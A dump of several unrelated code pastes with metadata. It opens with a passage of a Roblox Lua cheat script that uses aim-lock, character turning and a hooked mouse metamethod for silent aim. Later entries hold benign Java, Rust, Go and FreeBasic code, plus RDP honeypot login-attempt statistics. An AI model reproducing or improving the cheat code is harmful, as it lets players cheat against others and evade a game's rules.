                                                                            local NearestPos = CFrame.new(LocalPlayer.Character.PrimaryPart.Position, Vector3.new(Lock.Target.Player.Character.HumanoidRootPart.Position.X, LocalPlayer.Character.PrimaryPart.Position.Y, Lock.Target.Player.Character.HumanoidRootPart.Position.Z))
                                                                            LocalPlayer.Character:SetPrimaryPartCFrame(NearestPos)
                                                                        end 
                                                                        -- 
                                                                        if Lock.Target.Position then 
                                                                            local Position1, OnScreen = Camera:WorldToViewportPoint(Lock.Target.Position)
                                                                            local MousePosition = NewVector2(Mouse.X, Mouse.Y + 36)
                                                                            local Magn = (MousePosition - NewVector2(Position1.X, Position1.Y)).Magnitude
                                                                            -- 
                                                                            if Lock.Drawings.FOV.Visible then 
                                                                                Lock.Drawings.FOV.Position = NewVector2(Mouse.X, Mouse.Y + 36)
                                                                                if (Magn >= Lock.Drawings.FOV.Radius) then Lock.Target.Status = false end 
                                                                            end
                                                                            -- 
                                                                            if Lock.Visualize.Hitbox == true then 
                                                                                Lock.Drawings.FakeHitbox.CFrame = NewCFrame(Lock.Target.Position)
                                                                                Lock.Drawings.FakeHitbox.Size = NewVector3(Lock.Visualize.X, Lock.Visualize.Y, Lock.Visualize.Z)
                                                                            else 
                                                                                Lock.Drawings.FakeHitbox.CFrame = NewCFrame(999,9999,999)
                                                                            end 
                                                                            -- 
                                                                            if OnScreen then 
                                                                                if Lock.Visualize.Tracer[1] then 
                                                                                    Lock.Drawings.Tracer.Visible = true 
                                                                                    --
                                                                                    if Lock:GetTracerOrigin(Lock.Visualize.Tracer[2]) ~= nil then 
                                                                                        local Position2, OnScreen = Lock:GetTracerOrigin(Lock.Visualize.Tracer[2])  
                                                                                        --
                                                                                        if Position2 then 
                                                                                            Lock.Drawings.Tracer.From = Vector2.new(Position2.X, Position2.Y)
                                                                                        end 
                                                                                    end 
                                                                                    Lock.Drawings.Tracer.To = Vector2.new(Position1.X, Position1.Y)
                                                                                end
                                                                                -- 
                                                                                if Lock.Visualize.Dot then 
                                                                                    Lock.Drawings.Dot.Visible = true 
                                                                                    Lock.Drawings.Dot.Position = NewVector2(Position1.X, Position1.Y)
                                                                                else 
                                                                                    Lock.Drawings.Dot.Visible = false 
                                                                                end 
                                                                                -- 
                                                                                if Lock.Visualize.Strafe and Lock.Target_Strafe[1] then 
                                                                                end 
                                                                            else 
                                                                                Lock.Drawings.Dot.Visible = false 
                                                                                Lock.Drawings.Tracer.Visible = false 
                                                                            end  
                                                                        end 
                                                                    end
                                                                end
                                                            end)
                                                            
    if not LPH_OBFUSCATED then
    getfenv().LPH_NO_VIRTUALIZE = function(f) return f end;
    end
    local Old
    Old = hookmetamethod(game, ""__index"", LPH_NO_VIRTUALIZE(function(self, k)
        if (self:IsA(""Mouse"") and (k == ""Hit"" or k == ""Target"")) and Lock.Locking and Lock.Target.Player then 
            local Part = Lock.Prediction.Part or ""HumanoidRootPart""
            if Lock.Prediction.Air == true and Lock.Target.Player.Character.Humanoid.FloorMaterial == Enum.Material.Air then 
                SilentArg = Lock.Target.Player.Character[""LeftFoot""].Position + (Lock.Target.Velocity * Lock.Target.Prediction)
            else 
                SilentArg = Lock.Target.Player.Character[Part].Position + (Lock.Target.Velocity * Lock.Target.Prediction)
            end 
            Lock.Target.Position = SilentArg
            -- 
            if Lock.Target.Status == true then  
                return (k == ""Hit"" and NewCFrame(SilentArg))
            end 
        end 
        return Old(self, k) 
    end))
    
    Notifications(""Loaded In ""..string.format(""%.2f"", tostring(tick() - loadingtime,nil))..tostring("" Seconds""))
    loadingtime = nil
    end
    
if boostframes then
    getgenv().boostFPS = true

    local vim = game:GetService(""VirtualInputManager"")
    setfpscap(999)
    
    game.DescendantAdded:Connect(function(d)
       if d.Name == ""MainView"" and d.Parent.Name == ""DevConsoleUI"" and boostFPS then
           task.wait()
           local screen = d.Parent.Parent.Parent
           screen.Enabled = false;
           d.Visible = false;
       end
    end)
    
    vim:SendKeyEvent(true, ""F9"", 0, game)    
    wait()
    vim:SendKeyEvent(false, ""F9"", 0, game)  
    
    while true do
       task.wait()
       if not boostFPS then
           continue;
       end
    
    end
end

end)"
UZMRWPFy,ConfigClass,devenshona,Java,Friday 12th of April 2024 09:07:30 PM CDT,"package me.spacemex.anotherhammermod;

import net.minecraftforge.common.ForgeConfigSpec;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.event.config.ModConfigEvent;
import net.minecraftforge.fml.event.lifecycle.FMLCommonSetupEvent;
import net.minecraftforge.fml.loading.FMLConfig;

import java.util.List;

@Mod.EventBusSubscriber(modid = AnotherHammerMod.MODID, bus = Mod.EventBusSubscriber.Bus.MOD)
public class Config
{
    private static final String EXPLAIN = ""Example 3x1 3 Being The Radius And 1 Being The Depth\n"" +
            ""So It Would Mine A  3x3 Radius And Only Go One Block Deep"";
    private static final ForgeConfigSpec.Builder BUILDER = new ForgeConfigSpec.Builder();


    public static final ForgeConfigSpec.ConfigValue<String> WOODEN_HAMMER_STATS = BUILDER
            .comment(""The Stats For The Wooden Hammer Default Is 3x1"")
            .comment(EXPLAIN)
            .define(""modHammerStats"", ""3x1"")
            ;

    static final ForgeConfigSpec SPEC = BUILDER.build();



    @SubscribeEvent
    static void onLoad(final ModConfigEvent event)
    {

    }
}"
MMe8Dx6r,ItemClass,devenshona,Java,Friday 12th of April 2024 09:06:06 PM CDT,"package me.spacemex.anotherhammermod.items;

import net.minecraft.world.item.Item;
import net.minecraft.world.item.Tier;
import net.minecraft.world.item.Tiers;
import net.minecraftforge.eventbus.api.IEventBus;
import net.minecraftforge.registries.DeferredRegister;
import net.minecraftforge.registries.ForgeRegistries;
import net.minecraftforge.registries.RegistryObject;

import java.util.ArrayList;
import java.util.List;

import static me.spacemex.anotherhammermod.AnotherHammerMod.*;

public class ItemsInit {
    public static final DeferredRegister<Item> ITEMS = 
            DeferredRegister.create(ForgeRegistries.ITEMS, MODID);
    
    public static List<RegistryObject<Item>> TOOLS = new ArrayList<>();

    public static final RegistryObject<Item> WOODEN_HAMMER =
            registerItem(""wooden_hammer"",
                    woodenHammerRadius,woodenHammerDepth,59,Tiers.WOOD);

    
    public static RegistryObject<Item> registerItem(String name, int radius,int depth, int durability, Tier tier) {
       RegistryObject<Item> newItem =  ITEMS.register(name,()-> new ModHammers(tier,()->radius,()->depth,()->durability));
        TOOLS.add(newItem);
        return newItem;
    }
    
    public static void init(IEventBus eventBus) {
         ITEMS.register(eventBus);
        
    }
}
"
kCBzzDU6,gltf + wgpu integration,fisharmy100,Rust,Friday 12th of April 2024 08:52:41 PM CDT,"// PLEASE NOTE: Not all files are included, spisifically alot of the wgpu helper functions

// ===================================================================================================
// Model.rs
// ===================================================================================================

pub struct Model 
{
    pub meshes: Vec<Mesh>,
    pub materials: HashMap<u64, Material>
}

impl Model
{
    pub fn vertex_layout() -> wgpu::VertexBufferLayout<'static>
    {
        Vertex::layout()
    }

    pub fn from_glb(bytes: &[u8], device: &wgpu::Device, queue: &wgpu::Queue) -> Result<Self, String> 
    {
        let data = match gltf::Gltf::from_slice(bytes)
        {
            Ok(ok) => ok,
            Err(e) => return Err(e.to_string())
        };

        let mut buffer_data: Vec<Vec<u8>> = Vec::new();
        for buffer in data.buffers() 
        {
            match buffer.source() 
            {
                gltf::buffer::Source::Bin => 
                {
                    if let Some(blob) = data.blob.as_deref() 
                    {
                        buffer_data.push(blob.into());
                    };
                }
                gltf::buffer::Source::Uri(_uri) => 
                {
                    return Err(""URI's are not implemented yet"".into())
                }
            }
        }

        let Some(mesh) = data.meshes().next() else { return Err(""glb file must have a mesh"".into()); };
        let meshes: Result<_, String> = mesh.primitives().map(|p| Mesh::from_primitive(p, &buffer_data, device)).collect();

        let mut materials = HashMap::new();
        for m in mesh.primitives().map(|p| p.material())
        {
            let id = get_gltf_material_id(m.clone());
            if materials.get(&id).is_none()
            {
                let material = match Material::from_glb(m, &buffer_data, device, queue) 
                {
                    Ok(ok) => ok,
                    Err(e) => return Err(e)
                };
                materials.insert(id, material);
            }
        }

        match meshes
        {
            Ok(ok) => Ok(Self { 
                meshes: ok,
                materials,
            }),
            Err(err) => Err(err)
        }
    }
}

pub struct Mesh 
{
    pub vertex_buffer: wgpu::Buffer,
    pub index_buffer: wgpu::Buffer,
    pub index_count: u32,
    pub material_id: u64,
}

impl Mesh 
{
    pub fn from_primitive<'a>(primitive: gltf::Primitive<'a>, buffer_data: &Vec<Vec<u8>>, device: &wgpu::Device) -> Result<Self, String> 
    {
        let reader = primitive.reader(|buffer| Some(&buffer_data[buffer.index()]));

        let mut vertices: Vec<Vertex> = match reader.read_positions()
        {
            Some(p) => p.map(|p| Vertex::new(p, Vec2::ZERO, Vec3::ZERO)),
            None => return Err(""Mesh needs vertex positions"".into())
        }.collect();

        println!(""{:?}"", vertices);

        match reader.read_colors(0)
        {
            Some(cs) => 
            {
                cs.into_rgb_f32().enumerate().for_each(|(i, c)| vertices[i].color = c);
            },
            None => {}
        };

        match reader.read_tex_coords(0)
        {
            Some(uvs) => 
            {
                uvs.into_f32().enumerate().for_each(|(i, uv)| { vertices[i].uv = uv});
            },
            None => {}
        }

        let indices: Vec<u32> = match reader.read_indices()
        {
            Some(i) => i.into_u32(),
            None => return Err(""Mesh does not have an index buffer"".into())
        }.collect();

        let vertex_buffer = make_vertex_buffer(VertexBufferDescriptor {
            data: &vertices,
            device,
            additional_usages: None,
            label: None
        });

        let index_buffer = make_index_buffer(IndexBufferDescriptor {
            data: IndexType::U32(&indices),
            device,
            additional_usages: None,
            label: None
        });

        let material_id = get_gltf_material_id(primitive.material());

        Ok(Self {
            vertex_buffer,
            index_buffer,
            index_count: indices.len() as u32,
            material_id,
        })
    }
}

pub struct MaterialTexture
{
    pub texture: wgpu::Texture,
    pub view: wgpu::TextureView,
    pub sampler: wgpu::Sampler,
    pub bind_group: wgpu::BindGroup,
}

impl MaterialTexture
{
    pub fn layout(device: &wgpu::Device) -> wgpu::BindGroupLayout
    {
        make_bind_group_layout(device, None, &[
            EntryType::Texture { 
                visibility: wgpu::ShaderStages::FRAGMENT, 
                view_dim: wgpu::TextureViewDimension::D2, 
                sample_type: wgpu::TextureSampleType::Float { filterable: true } 
            },
            EntryType::Sampler { 
                visibility: wgpu::ShaderStages::FRAGMENT, 
                binding_type: wgpu::SamplerBindingType::Filtering 
            }
        ])
    }

    pub fn new(texture: wgpu::Texture, device: &wgpu::Device) -> Self 
    {
        let view = make_default_texture_view(&texture);
        let sampler = make_pixel_sampler(device);
        let layout = Self::layout(device);
        let bind_group = make_bind_group(device, &layout, None, [
            wgpu::BindingResource::TextureView(&view),
            wgpu::BindingResource::Sampler(&sampler)
        ]);

        Self 
        {
            texture,
            view,
            sampler,
            bind_group
        }
    }
}

pub struct Material 
{
    pub color: Color,
    pub texture: Option<MaterialTexture>
}

impl Material
{
    pub fn from_glb(mat: gltf::Material, buffer_data: &Vec<Vec<u8>>, device: &wgpu::Device, queue: &wgpu::Queue) -> Result<Self, String>
    {
        let color = mat.pbr_metallic_roughness().base_color_factor();
        let texture = match mat.pbr_metallic_roughness().base_color_texture()
        {
            Some(texture) => 
            {
                let source = texture.texture().source().source();
                match source
                {
                    Source::View { view, mime_type } => 
                    {
                        let parent_buffer_data = &buffer_data[view.buffer().index()];
                        let data = &parent_buffer_data[view.offset()..view.offset() + view.length()];
                        let mime_type = mime_type.replace('/', ""."");
                        let image = image::load_from_memory_with_format(
                                data,
                                image::ImageFormat::from_path(mime_type).unwrap(),
                            ).unwrap();
                        
                        let rgba = image.to_rgba8();
                        let texture = make_rgba_texture(MakeRgbaTextureDescriptor {
                            rgba: &rgba,
                            device,
                            queue,
                            label: None,
                            additional_usages: None
                        });

                        Some(MaterialTexture::new(texture, device))
                    },
                    Source::Uri { uri: _, mime_type: _ } => return Err(""Texture URI's not supported"".into()),
                }
            }
            None => None,
        };

        Ok(Self 
        {
            color: Color::from_vec4(color.into()),
            texture,
        })
    }
}

fn get_gltf_material_id(mat: gltf::Material) -> u64
{
    let mut hasher = DefaultHasher::new();
    mat.index().hash(&mut hasher);
    hasher.finish()
}

#[derive(ecs::Resource)]
pub struct ModelRenderer
{
    color_pipeline: wgpu::RenderPipeline,
    texture_pipeline: wgpu::RenderPipeline,

    camera_uniform: wgpu::Buffer,
    camera_bind_group: wgpu::BindGroup,
    
    color_uniform: wgpu::Buffer,
    color_bind_group: wgpu::BindGroup,

    // TEMP
    model: Model,
}

impl ModelRenderer
{
    pub fn new(state: &WgpuState) -> Self 
    {
        let device = &state.device();

        let camera_uniform = make_uniform_buffer(UniformBufferDescriptor {
            label: None,
            device,
            data: Mat4::ZERO,
            additional_usages: Some(BufferUsages::COPY_DST)
        });

        let camera_layout = make_bind_group_layout(&state.device(), None, &[
            EntryType::Uniform(ShaderStages::VERTEX),
        ]);

        let camera_bind_group = make_bind_group(&state.device, &camera_layout, None, [
            camera_uniform.as_entire_binding(),
        ]);

        let color_uniform = make_uniform_buffer(UniformBufferDescriptor {
            label: None,
            device,
            data: Vec4::ZERO,
            additional_usages: Some(BufferUsages::COPY_DST)
        });

        let color_layout = make_bind_group_layout(&state.device(), None, &[
            EntryType::Uniform(ShaderStages::VERTEX),
        ]);

        let color_bind_group = make_bind_group(&state.device, &color_layout, None, [
            color_uniform.as_entire_binding(),
        ]);

        let color_pipeline = make_color_render_pipeline(state, &camera_layout, &color_layout);
        let texture_pipeline = make_texture_render_pipeline(state, &camera_layout, &color_layout);

        let model = Model::from_glb(include_bytes!(""../../assets/models/test_slab.glb""), &device, &state.queue()).unwrap();

        Self 
        {
            color_pipeline,
            texture_pipeline,
            camera_uniform,
            camera_bind_group,
            color_uniform,
            color_bind_group,
            model
        }
    }

    pub fn draw(&self, state: &WgpuState, view_proj: &Mat4, depth_texture: &DepthTexture, view: &wgpu::TextureView)
    {
        state.queue().write_buffer(&self.camera_uniform, 0, bytemuck::bytes_of(view_proj));

        for mesh in &self.model.meshes
        {
            let mut encoder = make_command_encoder(&state.device());
        
            let material = self.model.materials.get(&mesh.material_id).unwrap();
            state.queue().write_buffer(&self.color_uniform, 0, bytemuck::bytes_of(&material.color.as_vec4()));

            let mut render_pass = make_render_pass(&mut encoder, view, Some(depth_texture));

            if let Some(texture) = &material.texture
            {
                render_pass.set_pipeline(&self.texture_pipeline);
                render_pass.set_bind_group(2, &texture.bind_group, &[]);
            } 
            else 
            {
                render_pass.set_pipeline(&self.color_pipeline);
            }

            render_pass.set_bind_group(0, &self.camera_bind_group, &[]);
            render_pass.set_bind_group(1, &self.color_bind_group, &[]);

            render_pass.set_vertex_buffer(0, mesh.vertex_buffer.slice(..));
            render_pass.set_index_buffer(mesh.index_buffer.slice(..), wgpu::IndexFormat::Uint32);
            render_pass.draw_indexed(0..mesh.index_count, 0, 0..1);
            
            drop(render_pass);
            state.queue().submit(std::iter::once(encoder.finish()));
        }
    }
}

pub fn make_color_render_pipeline(state: &WgpuState, camera_layout: &wgpu::BindGroupLayout, color_layout: &wgpu::BindGroupLayout) -> wgpu::RenderPipeline
{
    let shader = &state.device().create_shader_module(include_spirv!(env!(""color_mesh_shader.spv"")));
    make_render_pipeline(&state.device(), state.surface_config(), &RenderPipelineInfo {
        shader,
        vs_main: ""vs_main"",
        fs_main: ""fs_main"",
        opacity: Opacity::Opaque,
        vertex_buffers: &[&Model::vertex_layout()],
        bind_groups: &[&camera_layout, &color_layout],
        label: None,
        has_depth_texture: true
    })
}

pub fn make_texture_render_pipeline(state: &WgpuState, camera_layout: &wgpu::BindGroupLayout, color_layout: &wgpu::BindGroupLayout) -> wgpu::RenderPipeline
{
    let shader = &state.device().create_shader_module(include_spirv!(env!(""texture_mesh_shader.spv"")));
    let model_texture_layout = MaterialTexture::layout(&state.device());

    make_render_pipeline(&state.device(), state.surface_config(), &RenderPipelineInfo {
        shader,
        vs_main: ""vs_main"",
        fs_main: ""fs_main"",
        opacity: Opacity::Opaque,
        vertex_buffers: &[&Model::vertex_layout()],
        bind_groups: &[&camera_layout, &color_layout, &model_texture_layout],
        label: None,
        has_depth_texture: true
    })
}

// ===================================================================================================
// Texture.rs
// ===================================================================================================
#[derive(Debug, Clone, Copy)]
pub struct MakeRgbaTextureDescriptor<'a>
{
    pub rgba: &'a ImageBuffer<Rgba<u8>, Vec<u8>>,
    pub device: &'a wgpu::Device,
    pub queue: &'a wgpu::Queue,
    pub label: Option<&'a str>,
    pub additional_usages: Option<wgpu::TextureUsages>,
}

pub fn make_rgba_texture(desc: MakeRgbaTextureDescriptor) -> wgpu::Texture
{
    let MakeRgbaTextureDescriptor {
        rgba,
        device,
        queue,
        label,
        additional_usages
    } = desc;

    let dim = rgba.dimensions();

    let usage = wgpu::TextureUsages::TEXTURE_BINDING | wgpu::TextureUsages::COPY_DST | match additional_usages {
        Some(u) => u,
        None => wgpu::TextureUsages::empty()
    };

    let texture_size = wgpu::Extent3d {
        width: dim.0,
        height: dim.1,
        depth_or_array_layers: 1,
    };

    let texture = device.create_texture(&wgpu::TextureDescriptor {
        size: texture_size,
        mip_level_count: 1,
        sample_count: 1,
        dimension: wgpu::TextureDimension::D2,
        format: wgpu::TextureFormat::Rgba8UnormSrgb,
        usage,
        label,
        view_formats: &[],
    });

    let copy_texture = wgpu::ImageCopyTexture {
        texture: &texture,
        mip_level: 0,
        origin: wgpu::Origin3d::ZERO,
        aspect: wgpu::TextureAspect::All
    };

    let data_layout = wgpu::ImageDataLayout {
        offset: 0,
        bytes_per_row: Some(4 * dim.0),
        rows_per_image: Some(dim.1),
    };

    queue.write_texture(copy_texture, &rgba, data_layout, texture_size);

    texture
}"
E2LTPfAc,Untitled,Falexom,Go,Friday 12th of April 2024 08:27:57 PM CDT,"package main

import (
	""errors""
	""fmt""
	""math/rand""
	""sync/atomic""
	""time""
)

type Mutexx interface {
	Lock()
	Unlock()
	TestLock()
}

type Mutex struct {
	locked int32
}

func (m *Mutex) Lock() {
	currentMutexState := atomic.LoadInt32(&m.locked)

	if currentMutexState == 0 {
		atomic.StoreInt32(&m.locked, 1)
	} else {
		err := errors.New(""can't lock locked mutex"")
		fmt.Println(err)
		return
	}
}

func (m *Mutex) Unlock() {
	currentMutexState := atomic.LoadInt32(&m.locked)

	if currentMutexState == 1 {
		atomic.StoreInt32(&m.locked, 0)
	} else {
		err := errors.New(""can't unlock unlocked mutex"")
		fmt.Println(err)
		return
	}
}

func (m *Mutex) lockedOrNot() bool {
	if m.locked == 0 {
		return false
	} else {
		return true
	}
}

type testData struct {
	value int
	mu    *Mutex
}

func (t *testData) setData(newValue int) bool {
	if t.mu.lockedOrNot() {
		err := errors.New(""can't store while mutex locked"")
		fmt.Println(err)
		return false
	} else {
		t.mu.Lock()
		t.value = newValue
		fmt.Printf(""%d successfully changed"", t.value)
		t.mu.Unlock()
		return true
	}
}

func testCase(value int, mu *Mutex) {
	fmt.Printf(""%d entered loop\n"", value)

	for {
		td := &testData{mu: mu}
		fmt.Printf(""%d current state of mutex\n"", atomic.LoadInt32(&mu.locked))
		min := int64(1000000000)
		max := int64(10000000000)
		randomNumber := rand.Int63n(max-min+1) + min

		if td.setData(value) {
			fmt.Printf(""%d was stored\n"", value)
			time.Sleep(time.Duration(randomNumber))
			fmt.Printf(""%d unlocked mutex\n"", value)
		} else {
			time.Sleep(time.Duration(randomNumber))
			fmt.Printf(""%d blocked mutex\n"", td.value)
		}
	}
}

func main() {
	fmt.Println(""start"")
	mu := &Mutex{}
	for i := 5; i < 10; i++ {
		go testCase(i, mu)
	}
	select {}
}
"
2xHFsimN,Untitled,retroman,FreeBasic,Friday 12th of April 2024 08:06:15 PM CDT,"dim mystr as string = ""hello""
dim ilen as integer = len(mystr)
dim tmp as string = string(ilen,!""\0"")

print mystr

print ilen
ilen -= 1
dim i as integer = 0
tmp[i] = mystr[ilen - i]
i += 1
tmp[i] = mystr[ilen - i]
i += 1
tmp[i] = mystr[ilen - i]
i += 1
tmp[i] = mystr[ilen - i]
i += 1
tmp[i] = mystr[ilen - i]

print tmp
"
mW4q7LFj,Untitled,SenpaiZero,Java,Friday 12th of April 2024 07:43:51 PM CDT,"import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.util.Random;
import java.util.Scanner;


public class LabExer {

	public static void main(String[] args) {
		String line = null;
		String[] wordArray = new String[15];
		Random rand = new Random();
		int randomNum = rand.nextInt(14);
		String randomWord = """";
		String tempWord = """";
		Scanner scanner = new Scanner(System.in);
		String userInput;
		int attemps = 0;
		try {
			// Path for txt file
			FileReader file = new FileReader(""C:\\Users\\Xeb\\eclipse-workspace\\test\\asd\\src\\asd\\words.txt"");
			BufferedReader buffer = new BufferedReader(file);
			int indexArr = 0;
			while ((line = buffer.readLine()) != null) {
		  		wordArray[indexArr] = line.trim(); // removing whitespace/blanks
		  		++indexArr;
			  }		
			
			//Keep adding value until it's not empty or null
			while (randomWord.isEmpty() || randomWord == null) {
				randomWord = wordArray[randomNum].trim();
			}
			tempWord = randomWord;
			//Always have a blank of at least 50% of the word
			char getElementRand[] = new char[(randomWord.length() / 2)];
			
			//Replacing random characters
			for (int i = 0; i < getElementRand.length; i++) {
				randomWord = randomWord.replace(getElementRand[i] = randomWord.charAt(rand.nextInt(randomWord.length())), '?');
			}
			
			boolean isContinue = true;
			boolean isCorrect = false;
			boolean isWrong = false;
			System.out.println(""Guess the word!\nType any number to quit\n\n"");
			do {
				if(!randomWord.equalsIgnoreCase(tempWord)) {
					System.out.println(""== "" + randomWord + "" =="");
					System.out.print(""Input: "");
					attemps++;
					userInput = scanner.next().toUpperCase();
					
					//Proceed if user input is not a number
					if(!userInput.matches(""\\d+"")) {
						//Keep looping until it goes through the whole word as character
						//And if it finds an equal character, it will proceed
						//else it's wrong
						for (int i = 0; i < tempWord.length(); i++) {
							if(userInput.equalsIgnoreCase(String.valueOf(tempWord.charAt(i)))) {
								randomWord = randomWord.substring(0,i) + userInput + randomWord.substring(i+1);
								isCorrect = true;
							} else { 
								isWrong = true;
							}
						}
						
						//Isolating the printing of correct and wrong answer
						//To stop looping/repeating the print
						if(isCorrect == true) {
							System.out.println(""Correct Answer!"");
							isCorrect = false;
						} else if (isWrong == true) {
							System.out.println(""Wrong Answer! Please Try Again..."");
							isWrong = false;
						}
						System.out.println(""----------------------------------------"");
					}
					else { //Stop the program if user input is number
						System.out.println(""You Gave up! Better Luck Next Time..."");
						isContinue = false;
					}
				}else { //Stops the program if user finished filling up the missing letters
					System.out.println(""Congratulation! You Filled up the Missing Letters!""
									+ ""\nThe Full Word is: "" + tempWord
									+ ""\nAttemps: "" + attemps);
					isContinue = false;
				}
			} while (isContinue);
		} catch (FileNotFoundException e) {
			System.out.println(e.getMessage());
		} catch (IOException e) {
			System.out.println(e.getMessage());
		}

	}
}
"
r78fMCz8,2024-04-12_stats.json,rdp_snitch,JSON,Friday 12th of April 2024 07:18:06 PM CDT,"{
  ""ip"": {
    ""45.227.254.8"": 15,
    ""198.135.49.131"": 3,
    ""151.106.40.212"": 18,
    ""206.168.34.126"": 3,
    ""112.4.139.162"": 6,
    ""194.165.16.10"": 6,
    ""58.218.204.183"": 9,
    ""207.90.244.3"": 3,
    ""122.169.207.168"": 9,
    ""198.235.24.106"": 9,
    ""188.119.66.112"": 3,
    ""45.227.254.9"": 9,
    ""185.170.144.3"": 6,
    ""123.56.20.194"": 6,
    ""87.251.75.120"": 6,
    ""118.193.40.191"": 3,
    ""87.251.75.145"": 9,
    ""185.81.68.38"": 9,
    ""198.235.24.58"": 9,
    ""194.165.16.72"": 6,
    ""62.204.41.225"": 12,
    ""36.91.222.100"": 3,
    ""159.65.147.191"": 9,
    ""84.201.2.2"": 6,
    ""113.160.91.206"": 3,
    ""159.223.85.212"": 3,
    ""36.137.3.251"": 156,
    ""198.235.24.198"": 9,
    ""128.199.225.179"": 9,
    ""167.94.138.33"": 3,
    ""93.177.66.5"": 60,
    ""193.53.245.249"": 6,
    ""91.238.181.16"": 6,
    ""205.210.31.185"": 9,
    ""45.227.254.54"": 6
  },
  ""asn"": {
    ""AS267784"": 30,
    ""AS396073"": 3,
    ""AS34088"": 18,
    ""AS398324"": 6,
    ""AS56046"": 6,
    ""AS48721"": 12,
    ""AS4134"": 9,
    ""AS174"": 3,
    ""AS24560"": 9,
    ""AS396982"": 36,
    ""AS57523"": 12,
    ""AS197414"": 6,
    ""AS37963"": 6,
    ""AS208091"": 15,
    ""AS135377"": 3,
    ""AS59425"": 12,
    ""AS7713"": 3,
    ""AS14061"": 21,
    ""AS44066"": 6,
    ""AS45899"": 3,
    ""AS9808"": 156,
    ""AS197540"": 60,
    ""AS209711"": 6,
    ""AS49434"": 6
  },
  ""isp"": {
    ""Flyservers S.A."": 42,
    ""Majestic Hosting Solutions, LLC"": 3,
    ""Host Europe GmbH"": 18,
    ""Censys, Inc."": 6,
    ""China Mobile Communications Corporation"": 6,
    ""Chinanet"": 9,
    ""Cogent Communications"": 3,
    ""BHARTI"": 9,
    ""Google LLC"": 36,
    ""Chang Way Technologies Co. Limited"": 12,
    ""Xhost Internet Solutions LP"": 21,
    ""Hangzhou Alibaba Advertising Co"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Horizon LLC"": 12,
    ""PT Telekomunikasi Indonesia"": 3,
    ""DigitalOcean, LLC"": 21,
    ""www.accelerated.de"": 6,
    ""VietNam Post and Telecom Corporation"": 3,
    ""China Mobile"": 156,
    ""netcup GmbH"": 60,
    ""MUV Bilisim ve Telekomunikasyon Hizmetleri Ltd. Sti"": 6,
    ""Datacenter location PAR1 France"": 6
  },
  ""org"": {
    ""UAB Host Baltic"": 30,
    ""Majestic Hosting Solutions, LLC"": 3,
    ""Go Daddy Netherlands B.V"": 18,
    ""Censys Inc"": 3,
    ""China Mobile Communications Corporation"": 162,
    ""Flyservers S.A"": 12,
    ""Chinanet JS"": 9,
    ""SHODAN, LLC"": 3,
    ""ABTS AP"": 9,
    ""Palo Alto Networks, Inc"": 36,
    ""Chang Way Technologies Co. Limited"": 3,
    ""Xhostis"": 6,
    ""Aliyun Computing Co., LTD"": 6,
    ""Xhost Internet Solutions"": 15,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Starcrecium Limited"": 9,
    ""Horizon LLC"": 12,
    ""Telekomunikasi Indonesia"": 3,
    ""DigitalOcean, LLC"": 21,
    ""diva-e Datacenters GmbH"": 6,
    ""Vietnam Posts and Telecommunications Group"": 3,
    ""Censys, Inc"": 3,
    ""netcup GmbH"": 60,
    ""MUVHost - Vodafone Tuzla"": 6,
    ""ThinkTech Technology Industrial CO. Limited"": 6
  },
  ""regionName"": {
    ""Vilnius"": 30,
    ""Texas"": 6,
    ""Hauts-de-France"": 18,
    ""Illinois"": 3,
    ""Jiangsu"": 15,
    ""Kaunas"": 12,
    ""Telangana"": 9,
    ""California"": 36,
    ""Moscow"": 24,
    ""North Holland"": 21,
    ""Beijing"": 6,
    ""Kowloon"": 3,
    ""Jakarta"": 3,
    ""Karnataka"": 9,
    ""Hesse"": 6,
    ""Hanoi"": 3,
    ""South West"": 3,
    ""Guangdong"": 156,
    ""Central Singapore"": 9,
    ""Michigan"": 3,
    ""Bavaria"": 60,
    ""Istanbul"": 6,
    ""\u00cele-de-France"": 6
  },
  ""country"": {
    ""Lithuania"": 42,
    ""United States"": 48,
    ""France"": 24,
    ""China"": 177,
    ""India"": 18,
    ""Russia"": 24,
    ""The Netherlands"": 21,
    ""Hong Kong"": 3,
    ""Indonesia"": 3,
    ""Germany"": 66,
    ""Vietnam"": 3,
    ""Singapore"": 12,
    ""Turkey"": 6
  },
  ""account"": {
    ""Test"": 45,
    ""hello"": 291,
    ""(empty)"": 12,
    ""root"": 3,
    ""axfYszpEe"": 3,
    ""hSuCHH"": 3,
    ""onlgaX"": 3,
    ""Administr"": 27,
    ""Domain"": 30,
    ""Administrator"": 3,
    ""JWwPwFjIg"": 3,
    ""auXijw"": 3,
    ""xcCPvl"": 3,
    ""fdyModCDA"": 3,
    ""QvaGrR"": 3,
    ""ZKQlUs"": 3,
    ""YNPiHdULt"": 3,
    ""EJPVQZ"": 3,
    ""JoLEiN"": 3
  },
  ""keyboard"": {
    ""Unknown"": 447
  },
  ""client_build"": {
    ""Unknown"": 447
  },
  ""client_name"": {
    ""Unknown"": 447
  },
  ""ip_type"": {
    ""Unknown"": 114,
    ""hosting"": 159,
    ""mobile"": 162,
    ""proxy"": 12
  }
}"
uwCXAqhP,2024-04-12_stats.json,rdp_snitch,JSON,Friday 12th of April 2024 07:16:13 PM CDT,"{
  ""ip"": {
    ""45.227.254.8"": 10,
    ""198.135.49.131"": 2,
    ""151.106.40.212"": 12,
    ""206.168.34.126"": 2,
    ""112.4.139.162"": 4,
    ""194.165.16.10"": 4,
    ""58.218.204.183"": 6,
    ""207.90.244.3"": 2,
    ""122.169.207.168"": 6,
    ""198.235.24.106"": 6,
    ""188.119.66.112"": 2,
    ""45.227.254.9"": 6,
    ""185.170.144.3"": 4,
    ""123.56.20.194"": 4,
    ""87.251.75.120"": 4,
    ""118.193.40.191"": 2,
    ""87.251.75.145"": 6,
    ""185.81.68.38"": 6,
    ""198.235.24.58"": 6,
    ""194.165.16.72"": 4,
    ""62.204.41.225"": 8,
    ""36.91.222.100"": 2,
    ""159.65.147.191"": 6,
    ""84.201.2.2"": 4,
    ""113.160.91.206"": 2,
    ""159.223.85.212"": 2,
    ""36.137.3.251"": 104,
    ""198.235.24.198"": 6,
    ""128.199.225.179"": 6,
    ""167.94.138.33"": 2,
    ""93.177.66.5"": 40,
    ""193.53.245.249"": 4,
    ""91.238.181.16"": 4,
    ""205.210.31.185"": 6,
    ""45.227.254.54"": 4
  },
  ""asn"": {
